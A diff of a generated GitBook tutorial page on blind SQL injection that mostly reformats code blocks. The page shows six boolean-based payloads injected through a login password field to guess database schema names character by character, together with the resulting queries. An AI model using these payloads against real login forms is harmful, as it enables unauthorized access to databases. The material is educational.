@@ -31,7 +31,7 @@
 
 
         
-    <div class="book"  data-level="2.2" data-basepath="..\.." data-revision="1420527615512">
+    <div class="book"  data-level="2.2" data-basepath="..\.." data-revision="1420528014789">
     
 
 <div class="book-summary">
@@ -319,7 +319,7 @@
                 <div class="page-inner">
                 
                 
-                    <section class="normal" id="section-gitbook_52">
+                    <section class="normal" id="section-gitbook_237">
                     
                         <h1 id="sql-injections-2">SQL Injections 2</h1>
 <h3 id="more-advanced-sql">More Advanced SQL</h3>
@@ -559,41 +559,41 @@ New Lesson, New Table</p>
 </code></pre>
 <p>We can now use this magical operator to ask the server yes or no questions and find out all the information we need. We can input anything into the username that doesn&#39;t mess with the query. I&#39;ll be using &#39;bar&#39; without quotes. The following password queries were sent. The results are shown them.</p>
 <pre><code class="lang-sql"># Query 1
-' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'s%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #
-
-# <span class="hljs-keyword">Query</span> <span class="hljs-number">2</span>
-<span class="hljs-string">' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '</span>t%<span class="hljs-string">' AND TABLE_SCHEMA != '</span>information_schema<span class="hljs-string">') #
-
-# Query 3
-'</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'u%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #
-
-# <span class="hljs-keyword">Query</span> <span class="hljs-number">4</span>
-<span class="hljs-string">' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '</span>tt%<span class="hljs-string">' AND TABLE_SCHEMA != '</span>information_schema<span class="hljs-string">') #
-
-# Query 5
-'</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tz%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #
-
-# <span class="hljs-keyword">Query</span> <span class="hljs-number">6</span>
-<span class="hljs-string">' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '</span>tu%<span class="hljs-string">' AND TABLE_SCHEMA != '</span>information_schema<span class="hljs-string">') #</span></span>
+' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'s%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
+</code></pre>
+<pre><code class="lang-sql"># Query 2
+' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'t%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
+</code></pre>
+<pre><code class="lang-sql"># Query 3
+' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'u%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
+</code></pre>
+<pre><code class="lang-sql"># Query 4
+' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tt%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
+</code></pre>
+<pre><code class="lang-sql"># Query 5
+' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tz%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
+</code></pre>
+<pre><code class="lang-sql"># Query 6
+' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tu%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
 </code></pre>
 <p>Resultant queries:</p>
 <pre><code class="lang-sql"># Query 1
-<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'s%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'
-
-# Query 2
-SELECT * FROM userinfo WHERE Username='</span>bar<span class="hljs-string">' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '</span>t%<span class="hljs-string">' AND TABLE_SCHEMA != '</span>information_schema<span class="hljs-string">') #'</span>
-
-# <span class="hljs-keyword">Query</span> <span class="hljs-number">3</span>
-<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'u%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'
-
-# Query 4
-SELECT * FROM userinfo WHERE Username='</span>bar<span class="hljs-string">' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '</span>tt%<span class="hljs-string">' AND TABLE_SCHEMA != '</span>information_schema<span class="hljs-string">') #'</span>
-
-# <span class="hljs-keyword">Query</span> <span class="hljs-number">5</span>
-<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tz%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'
-
-# Query 6
-SELECT * FROM userinfo WHERE Username='</span>bar<span class="hljs-string">' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '</span>tu%<span class="hljs-string">' AND TABLE_SCHEMA != '</span>information_schema<span class="hljs-string">') #'</span></span>
+<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'s%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
+</code></pre>
+<pre><code class="lang-sql"># Query 2
+<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'t%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
+</code></pre>
+<pre><code class="lang-sql"># Query 3
+<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'u%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
+</code></pre>
+<pre><code class="lang-sql"># Query 4
+<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tt%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
+</code></pre>
+<pre><code class="lang-sql"># Query 5
+<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tz%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
+</code></pre>
+<pre><code class="lang-sql"># Query 6
+<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tu%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
 </code></pre>
 <p>Results:</p>
 <pre><code># Query 1 - Failed
